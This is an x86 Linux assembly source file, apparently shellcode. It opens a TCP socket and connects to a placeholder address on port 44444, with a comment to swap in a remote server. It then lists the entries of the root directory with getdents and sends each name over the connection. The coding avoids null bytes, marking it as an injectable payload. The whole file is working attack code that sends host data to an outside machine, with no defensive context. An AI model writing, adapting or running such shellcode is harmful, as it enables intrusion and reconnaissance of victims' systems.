BITS 32

section .text
global _start

_start:
    ; int socketcall(int call, unsigned long *args) syscall 0x66
    ; sockfd = socket(socket_family = 2 (PF_INET), socket_type = 1 (SOCK_STREAM), protocol = 0)
    xor eax, eax
    mov al, 0x66  ; sys_socketcall
    xor ebx, ebx
    push ebx      ; push 0 (protocol)
    inc ebx       ; 
    push ebx      ; socket_type = 1 (SOCK_STREAM)
    inc ebx
    push ebx      ; socket_family = 2 (PF_INET)
    dec ebx       ; SYS_SOCKET ebx = 1 
    mov ecx, esp  ; ecx contains reference to socket arguments we just pushed
    int 0x80
    mov ebp, eax  ; Save sockfd into ebp

    ; int socketcall(int call, unsigned long *args) syscall 0x66
    ; connect(sockfd, &sockaddr, addrlen)    
    xor eax, eax
    mov al, 0x66 ; sys_socketcall
    push DWORD 0x0101017f ; 127.1.1.1 to avoid null bytes, replace this with remote server
    push WORD 0x9cad  ; port 44444
    inc ebx      ; AF_INET = 2
    push bx      ; push AF_INET
    mov ecx, esp ; sockaddr pointer
    push BYTE 16 ; sizeof(sockaddr) = 16
    push ecx     ; pointer to sockaddr
    push ebp     ; pointer to sockfd
    mov ecx, esp ; socket arguments to socketcall
    inc ebx      ; SYS_CONNECT, ebx = 3
    int 0x80


    ; int openat(int dirfd, const char *pathname, int flags) syscall 0x127
    xor eax, eax
    push eax       ; 
    push 0x2F2F2F2F; path"//// 0x00"
    mov ax, 0x127  ; syscall 0x127 openat
    mov bx, -100   ; dirfd = AT_FDCWD (behave like open())
    mov ecx, esp   ; reference to pathname we just pushed
    xor edx, edx   ; flags = O_RDONLY (0)
    int 0x80


    ; int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) syscall 0x8d
    mov ebx,eax      ; Store fd in EBX
    xor eax,eax
    mov al, 141      ; syscall 0x8d getdents
    xor edx,edx
    mov dx, 0xFFFF   ; count (buffer size 65535)
    sub esp, edx     ; reserve buffer
    mov ecx, esp     ; point to the buffer (linux_dirent *dirp)
    int 0x80

    xchg eax,edx     ; EDX contains the bytes read from getdents

    ; LOOP on struct linux_dirent
    ; struct linux_dirent {
    ;    unsigned long  d_ino;     /* Inode number */
    ;    unsigned long  d_off;     /* Offset to next linux_dirent */
    ;    unsigned short d_reclen;  /* Length of this linux_dirent */
    ;    char           d_name[];  /* Filename (null-terminated) */
    ;                      /* length is actually (d_reclen - 2 -
    ;                         offsetof(struct linux_dirent, d_name)) */
    ;    /*
    ;    char           pad;       // Zero padding byte
    ;    char           d_type;    // File type (only since Linux 2.6.4); offset is (d_reclen - 1)
    ;    */
    ; }
.LOOPDIRENT:
    test edx, edx     ; check if we reached the end
    jz short .EXIT
    lea esi, [ecx+10] ; ESI contains buffer
    movzx eax, WORD [ecx+8]  ; load d_reclen in eax to calc strlen of d_name
    sub edx, eax      ; substract the size with the current linux_dirent size
    add ecx, eax      ; calculate the next linux dirent address
    push edx          ; save the number of bytes left
    push ecx          ; save the next linux dirent address
    sub eax, 12       ; ulong + ulong + ushort + char + char = 12
    mov edi, eax      ; edi contains strlen of d_name
    add eax, esi      ; eax points to end of d_name 
    xor BYTE [eax], 0xa; overwrite null byte with newline for readability
    inc edi           ; because of newline
    
    ;; int socketcall(int call, unsigned long *args) syscall 0x66
    ;; ssize_t send(int sockfd, const void *buf, size_t len, int flags);
    xor eax, eax
    push eax     ; flags = 0
    mov al, 0x66 ; sys_socketcall
    push edi     ; buf_len
    push esi     ; buf
    push ebp     ; sockfd
    mov ecx, esp ; socket arguments to socketcall
    mov bl, 0x9  ; SOCKET_SEND
    int 0x80

    add esp, 16  ; substract the 4 values we pushed in socketcall send
    pop ecx      ; restore
    pop edx      ; restore 
    jmp short .LOOPDIRENT

.EXIT:
    ; int exit(0)
    mov al, 1
    xor ebx, ebx
    int 0x80
